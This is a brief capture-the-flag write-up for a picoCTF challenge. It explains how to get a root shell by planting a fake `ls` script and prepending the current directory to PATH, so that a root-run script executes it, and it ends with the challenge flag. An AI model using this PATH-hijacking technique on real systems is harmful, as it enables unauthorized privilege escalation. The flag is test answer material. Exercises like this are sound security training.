# VNE
Points: 200

This challenge was simple: you are given a ssh shell that contains a script which runs as root.
The script runs `ls` on a user supplied directory.

Write a simple bash script called `ls` in the home directory:
```
#!/bin/sh

/bin/sh
```
Then rewrite the `PATH` environment variable to search the current directory first:
```
export PATH=".:$PATH"
```
Finally execute the given script to get a root shell and leak the flag.

# Flag: `picoCTF{Power_t0_man!pul4t3_3nv_302623e9}`